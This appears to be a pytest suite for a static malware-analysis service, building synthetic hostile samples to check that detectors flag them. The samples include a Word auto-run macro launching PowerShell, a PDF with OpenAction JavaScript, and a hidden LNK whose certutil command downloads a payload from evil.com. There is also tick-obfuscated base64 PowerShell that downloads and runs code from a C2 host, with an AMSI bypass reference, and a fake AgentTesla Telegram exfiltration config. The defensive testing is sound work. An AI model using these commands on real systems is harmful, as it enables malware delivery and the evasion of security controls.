"""Comprehensive test suite for multi-format static analysis:
Office, PDF, LNK, Archive, Script, Config Decoders, Provenance, and Fidelity.
"""

import io
import zipfile

from app.services import static_analysis


def test_office_macro_and_template_detection():
    # 1. Macro detection in docm
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/></Types>')
        zf.writestr("word/document.xml", "<w:document><w:body><w:p><w:r><w:t>Macro Payload</w:t></w:r></w:p></w:body></w:document>")
        zf.writestr("word/vbaProject.bin", b"Sub AutoOpen()\nSet s = CreateObject(\"WScript.Shell\")\ns.Run \"powershell.exe\"\nEnd Sub")
    data = buf.getvalue()

    res = static_analysis.analyze_sample(data)
    assert res["format"] == "office"
    assert res["office"]["has_macros"] is True
    assert "word/vbaProject.bin" in res["office"]["macro_streams"]
    assert any("office-vba" in f["id"] for f in res["findings"])
    assert res["verdict"] in ("malicious", "suspicious")


def test_pdf_openaction_and_javascript():
    pdf_payload = (
        b"%PDF-1.7\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert('pwned');) >>\nendobj\n"
        b"trailer\n<< /Root 1 0 R >>\n%%EOF\n"
    )
    res = static_analysis.analyze_sample(pdf_payload)
    assert res["format"] == "pdf"
    assert res["pdf"]["has_open_action"] is True
    assert res["pdf"]["has_javascript"] is True
    assert any(f["id"] == "pdf-auto-action-trigger" for f in res["findings"])
    assert any(f["id"] == "pdf-embedded-javascript" for f in res["findings"])


def test_lnk_stealth_sw_hide_and_lolbin():
    # Construct minimal LNK
    lnk = bytearray(b"\x4C\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46")
    lnk.extend(b"\x21\x00\x00\x00")  # Flags: HasTargetIDList | HasArguments
    lnk.extend(b"\x00" * 32)
    lnk.extend(b"\x00\x00\x00\x00")  # ShowCommand: SW_HIDE (0)
    lnk.extend(b"\x00" * 16)
    lnk.extend(b"C:\\Windows\\System32\\cmd.exe /c certutil.exe -urlcache -split -f http://evil.com/payload.exe")

    res = static_analysis.analyze_sample(bytes(lnk))
    assert res["format"] == "lnk"
    assert res["lnk"]["is_hidden_window"] is True
    assert "cmd.exe" in res["lnk"]["matched_lolbins"] or "certutil.exe" in res["lnk"]["matched_lolbins"]
    assert any(f["id"] == "lnk-hidden-window-execution" for f in res["findings"])


def test_archive_zip_bomb_safety_guard():
    # Construct small compressed data with simulated high uncompressed size
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # 10 MB uncompressed, compressed to tiny size
        zf.writestr("huge_file.dat", b"\x00" * (10 * 1024 * 1024))
    data = buf.getvalue()

    res = static_analysis.analyze_sample(data)
    assert res["format"] == "container"
    # Should catch decompression bomb ratio (> 100:1) safely
    assert any("bomb" in f["id"] for f in res["findings"]) or res["archive"]["file_count"] >= 1


def test_script_layered_deobfuscation():
    # Obfuscated PowerShell with tick marks and base64
    obfuscated = (
        b"p`o`w`e`r`s`h`e`l`l -e`n`c "
        b"SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYzIueHl6L3gnKQ==\n"
        b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n"
    )
    res = static_analysis.analyze_sample(obfuscated)
    assert res["format"] == "script"
    assert res["script"]["format"] == "powershell"
    assert any("tick" in t.lower() for t in res["script"]["transforms_applied"])
    assert any("base64" in t.lower() for t in res["script"]["transforms_applied"])
    assert any("amsi" in f["id"] for f in res["findings"])


def test_family_config_decoder_agent_tesla():
    # Synthetic AgentTesla binary chunk
    fake_binary = (
        b"MZ" + b"\x00" * 200 +
        b"AgentTesla WebPanel smtpserver "
        b"api.telegram.org/bot123456789:ABCDEF1234567890abcdef1234567890abc/sendmessage\x00"
    )
    res = static_analysis.analyze_sample(fake_binary)
    assert len(res["decoded_configs"]) >= 1
    cfg = res["decoded_configs"][0]
    assert cfg["family"] == "AgentTesla"
    assert cfg["exfiltration_protocol"] == "telegram"
    assert "api.telegram.org" in cfg["c2_endpoint"]
